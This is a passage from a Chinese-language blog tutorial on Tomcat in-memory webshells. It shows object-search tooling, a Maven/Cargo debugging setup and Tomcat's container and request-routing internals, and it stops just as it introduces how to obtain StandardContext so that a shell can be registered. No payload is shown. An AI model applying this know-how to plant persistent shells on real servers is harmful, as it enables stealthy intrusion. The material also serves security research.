<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置搜索类型包含Request关键字的对象</span></span><br><span class="line">java.util.List&lt;me.gv7.tools.josearcher.entity.Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">java</span>.util.ArrayList&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">me</span>.gv7.tools.josearcher.entity.Keyword.Builder().setField_type(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).build());</span><br><span class="line"></span><br><span class="line"><span class="comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span></span><br><span class="line"><span class="comment">// me.gv7.tools.josearcher.searcher.SearchRequstByBFS searcher = new me.gv7.tools.josearcher.searcher.SearchRequstByBFS(Thread.currentThread(),keys);</span></span><br><span class="line">me.gv7.tools.josearcher.searcher.<span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">me</span>.gv7.tools.josearcher.searcher.SearchRequstByBFS(<span class="built_in">this</span>,keys);</span><br><span class="line"></span><br><span class="line"><span class="comment">//挖掘深度为20</span></span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//设置报告保存位置</span></span><br><span class="line">searcher.setReport_save_path(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure></div>

<p>关键字是搜索目标对象的关键，可以目标三个属性<strong>属性名</strong>（<code>field_name</code>），<strong>属性值</strong>（<code>field_value</code>）和<strong>属性类型</strong>（<code>field_type</code>）。</p>
<p>比如想搜索属性名为 <code>table</code> 同时属性值为 <code>test</code> 的对象，还搜索属性名 <code>request</code> 同时属性类型包含 <code>RequestInfo</code> 关键字的，对应的逻辑表达试如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(field_name = table &amp; field_value = test) || (field_name = request &amp; field_type = RequestInfo)</span><br></pre></td></tr></table></figure></div>

<p>编写代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_name(<span class="string">&quot;table&quot;</span>).setField_type(<span class="string">&quot;test&quot;</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_name(<span class="string">&quot;request&quot;</span>).setField_type(<span class="string">&quot;RequestInfo&quot;</span>).build());</span><br></pre></td></tr></table></figure></div>

<p>黑名单是定义哪些属性中不可能存有要搜索的目标对象，防止无意义的搜索，浪费时间。如果把上面的例子当做黑名单，编写的代码也是类似的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_name(<span class="string">&quot;table&quot;</span>).setField_value(<span class="string">&quot;test&quot;</span>).build());</span><br><span class="line">blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_name(<span class="string">&quot;request&quot;</span>).setField_type(<span class="string">&quot;RequestInfo&quot;</span>).build());</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这种方法是从当前上下文实例化的某个对象开始搜索的，而实际情况下我们还可以通过某个特定的类的静态成员获取指定的对象。因此如果使用这个工具无法搜索到指定对象的话可以考虑一下这种情况。</p>

    </div>
  </div>

<h2 id="容器调试"><a href="#容器调试" class="headerlink" title="容器调试"></a>容器调试</h2><p><code>cargo-maven3-plugin</code> 是 <a target="_blank" rel="noopener" href="https://codehaus-cargo.github.io/cargo/"><strong>Codehaus Cargo</strong></a> 项目提供的 Maven 插件，用于在 Maven 构建过程中 <strong>自动下载、配置、启动、部署和管理 Java Web 容器（如 Tomcat、Jetty、WildFly 等）</strong>。</p>
<p>Cargo 是插件，但它本质是由 <strong>容器适配层 + Maven 插件封装层</strong> 组成。</p>
<ul>
<li><code>Container</code>：代表你使用的 Web 容器（Tomcat7x&#x2F;9x、Jetty10x&#x2F;11x、WildFly22x 等）</li>
<li><code>Configuration</code>：控制容器的启动行为，比如端口、JVM 参数、部署路径等</li>
<li><code>Deployable</code>：WAR、EAR 或其他部署单元</li>
<li><code>zipUrlInstaller</code>：用于自动下载并解压你指定版本的容器安装包（保证版本精确）</li>
</ul>
<p><code>cargo-maven3-plugin</code> 的配置如下：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.11.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;maven.compiler.source&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;maven.compiler.target&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">debug</span>&gt;</span>true<span class="tag">&lt;/<span class="name">debug</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">debuglevel</span>&gt;</span>lines,vars,source<span class="tag">&lt;/<span class="name">debuglevel</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">failOnMissingWebXml</span>&gt;</span>false<span class="tag">&lt;/<span class="name">failOnMissingWebXml</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.cargo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cargo-maven3-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">container</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">containerId</span>&gt;</span>$&#123;container.id&#125;<span class="tag">&lt;/<span class="name">containerId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">type</span>&gt;</span>embedded<span class="tag">&lt;/<span class="name">type</span>&gt;</span> <span class="comment">&lt;!-- 同 JVM，IDE 直接 Debug --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">container</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">type</span>&gt;</span>standalone<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cargo.servlet.port</span>&gt;</span>8080<span class="tag">&lt;/<span class="name">cargo.servlet.port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">deployables</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">deployable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>war<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">location</span>&gt;</span>$&#123;project.build.directory&#125;/$&#123;project.build.finalName&#125;.war<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">context</span>&gt;</span>/<span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">deployable</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">deployables</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>cargo-maven3-plugin</code> 不会给项目引入源码，因此我们需要在 Maven 导入对应的项目方便调试：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 嵌入式 JSP 编译器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 嵌入式 EL 实现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 核心（保持，对齐源码/符号） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ECJ：让 JSP 编译带全量调试符号 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jdt<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ecj<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.33.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>cargo 运行的项目需要打包成 war 包，因此需要在 <code>&lt;project&gt;</code> 顶部补上：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>运行/调试配置</code> 中新建一个 Maven 配置，并且运行命令行设置为 <code>clean package cargo:run -f pom.xml</code>。</p>
<h1 id="容器类内存马"><a href="#容器类内存马" class="headerlink" title="容器类内存马"></a>容器类内存马</h1><p><strong>Java Web 容器</strong>（更准确叫“<strong>Servlet 容器</strong>”，Jakarta Servlet 规范的实现）是运行 <strong>Servlet&#x2F;JSP</strong> 等 Web 组件的运行时环境。它负责把底层的 <strong>HTTP 请求</strong>交给你的代码处理，并把 <strong>HTTP 响应</strong>发送回客户端，同时管理应用的加载、隔离与生命周期。</p>
<h2 id="Tomcat-内存马"><a href="#Tomcat-内存马" class="headerlink" title="Tomcat 内存马"></a>Tomcat 内存马</h2><p>Tomcat（Apache Tomcat）是一个<strong>开源的 Java Web 服务器 &#x2F; Servlet 容器</strong>：实现了 Jakarta Servlet、JSP、EL、WebSocket 等规范，把浏览器发来的 HTTP 请求交给你的 Servlet&#x2F;JSP 代码执行，再把结果作为 HTTP 响应返回。它既能当轻量 Web 服务器用，也常作为应用容器挂在 Nginx&#x2F;Apache httpd 之后。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Tomcat 的环境配置如下，其中 9.x 系列实现 Servlet 4.0 &#x2F; JSP 2.3；10.x 起转向 <strong>Jakarta</strong> 命名空间（<code>javax.*</code> → <code>jakarta.*</code>）。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ===== Tomcat 7 预设（embedded） ===== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.id</span>&gt;</span>tomcat7x<span class="tag">&lt;/<span class="name">container.id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.version</span>&gt;</span>7.0.109<span class="tag">&lt;/<span class="name">container.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ===== Tomcat 8.5 预设（embedded） ===== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.id</span>&gt;</span>tomcat8x<span class="tag">&lt;/<span class="name">container.id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.version</span>&gt;</span>8.5.100<span class="tag">&lt;/<span class="name">container.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ===== Tomcat 9 预设（embedded） ===== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.id</span>&gt;</span>tomcat9x<span class="tag">&lt;/<span class="name">container.id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.version</span>&gt;</span>9.0.109<span class="tag">&lt;/<span class="name">container.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ===== Tomcat 10.1 预设（embedded） ===== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.id</span>&gt;</span>tomcat10x<span class="tag">&lt;/<span class="name">container.id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">container.version</span>&gt;</span>10.1.46<span class="tag">&lt;/<span class="name">container.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>我们可以把 Tomcat 简单看成由下面三个部分组成的系统：</p>
<ul>
<li><strong>Catalina</strong>：Servlet 容器，负责容器层级与调度：<strong>Server → Service → Engine → Host → Context → Wrapper</strong>，还有 <strong>Pipeline&#x2F;Valve</strong>、Session&#x2F;Realm、安全等。</li>
<li><strong>Coyote</strong>：连接器&#x2F;协议栈（监听端口、解析 HTTP&#x2F;AJP，把 I&#x2F;O 转成容器可用的 Request&#x2F;Response，再把响应写回）。支持 HTTP&#x2F;1.1、<strong>HTTP&#x2F;2</strong>、AJP；实现包括 NIO、NIO2、APR&#x2F;native。</li>
<li><strong>Jasper</strong>：JSP 引擎（把 JSP 编译成 Servlet；文件变更时可重新编译）。</li>
</ul>
<p>结构如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Server</span><br><span class="line">└─ Service</span><br><span class="line">   ├─ Connector(们)   ← Coyote：监听端口，解析 HTTP/AJP</span><br><span class="line">   └─ Engine          ← Catalina：容器入口</span><br><span class="line">      ├─ Host(们)     ← 虚拟主机：按域名分站</span><br><span class="line">      │  └─ Context   ← Web 应用：一个 WAR / 目录</span><br><span class="line">      │     └─ Wrapper← 单个 Servlet 的“座位”</span><br><span class="line">      └─ Host ...</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>Server</strong>：Tomcat 整体进程（顶层容器）。</li>
<li><strong>Service</strong>：把“一组端口”(Connectors) 和 “一个处理器”(Engine) 绑在一起。常见只有一个 Service。</li>
<li><strong>Connector（Coyote）</strong>：开端口、收发字节、解析协议（HTTP&#x2F;1.1、AJP、可启用 HTTP&#x2F;2）。<strong>不懂 Servlet</strong>，只把请求交给 Engine。</li>
<li><strong>Engine（Catalina）</strong>：容器的总入口，下面都是 Catalina 的活儿。</li>
<li><strong>Host</strong>：虚拟主机（按域名区分多个站点）。<code>example.com</code>、<code>blog.example.com</code> 各是一个 Host。</li>
<li><strong>Context</strong>：一个 Web 应用（一个 WAR 或 webapps 里的目录）。它有<strong>上下文路径</strong>：<code>/</code>、<code>/app</code>、<code>/admin</code>…</li>
<li><strong>Wrapper</strong>：一个 Servlet 的容器节点（<code>StandardWrapper</code>），一个 Wrapper &#x3D; 一个 Servlet 实例。</li>
</ul>
<p>以请求 <code>http://shop.example.com/app/hello/list</code> 为例：</p>
<ol>
<li><p><strong>Connector</strong>（比如 8080 的 HTTP）<br>收到 TCP 连接→解析 HTTP→得到请求行&#x2F;头&#x2F;体。</p>
</li>
<li><p><strong>Adapter + Mapper</strong>（桥接 &amp; 路由匹配）</p>
<ul>
<li><p>读 Host 头：**<code>shop.example.com</code>** → 选中对应 <strong>Host</strong>；</p>
</li>
<li><p>读 URL 路径：在这个 Host 下找 Context，按“<strong>最长前缀</strong>”匹配：</p>
<ul>
<li>有 <code>&quot;/&quot;</code>、<code>&quot;/app&quot;</code>，就选 **<code>/app</code>**；</li>
</ul>
</li>
<li><p>余下路径再匹配 <strong>Servlet</strong> 映射（Wrapper）：优先级大致是<strong>精确</strong> → <strong>前缀 <code>/x/*</code></strong> → <strong>扩展名 <code>*.do</code></strong> → **默认 <code>/</code>**。</p>
</li>
</ul>
</li>
<li><p><strong>Engine&#x2F;Host&#x2F;Context&#x2F;Wrapper 的 Pipeline&#x2F;Valve</strong><br>进入 <strong>Engine.Pipeline</strong>，先跑你配的 Valves（访问日志、IP 还原等），<strong>Engine.Basic</strong>（<code>StandardEngineValve</code>）把请求交到目标 <strong>Host.Pipeline</strong>；<br>Host 同理，<strong>Host.Basic</strong> 交给 <strong>Context.Pipeline</strong>；<br>Context 同理，<strong>Context.Basic</strong> 交给 <strong>Wrapper.Pipeline</strong>；<br>最底层 **<code>StandardWrapperValve</code>**：</p>
<ul>
<li>分配&#x2F;初始化目标 Servlet；</li>
<li><strong>按 <code>filterMaps</code> 动态构建过滤器链</strong>；</li>
<li>执行所有 Filter，**链尾调用 <code>servlet.service(req, resp)</code>**。</li>
</ul>
</li>
</ol>
<h3 id="Tomcat-常见问题"><a href="#Tomcat-常见问题" class="headerlink" title="Tomcat 常见问题"></a>Tomcat 常见问题</h3><h4 id="如何获取-StandardContext"><a href="#如何获取-StandardContext" class="headerlink" title="如何获取 StandardContext"></a>如何获取 StandardContext</h4><p><strong><code>org.apache.catalina.core.StandardContext</code> 是 Catalina（Tomcat 的 Servlet 容器）里 <code>Context</code> 接口的标准实现</strong>。<strong>一个 <code>StandardContext</code> 就代表 Tomcat 里的一个 Web 应用（一个 WAR 或 webapp 目录）</strong>。</p>
<p>由于该容器负责<strong>组件注册与容器内部结构</strong>等重要功能，因此注册内存马的时候我们经常需要获取 <code>StandardContext</code>。</p>
<h5 id="从-ServletRequest-获取"><a href="#从-ServletRequest-获取" class="headerlink" title="从 ServletRequest 获取"></a>从 ServletRequest 获取</h5><p>无论是 JSP 中的 <code>request</code> 对象还是 <code>Servlet</code> 的 <code>service</code> 方法的 <code>ServletRequest</code> 参数，获取的 <code>Request</code> 实际上都是<code>org.apache.catalina.connector.RequestFacade</code> 类型的。</p>
<p>其中 <code>RequestFacade</code> 中的 <code>request</code> 成员是 <code>org.apache.catalina.connector.Request</code> 类型，我们可以通过调用它的 <code>getContext</code> 方法获取 <code>org.apache.catalina.core.StandardContext</code>：</p>
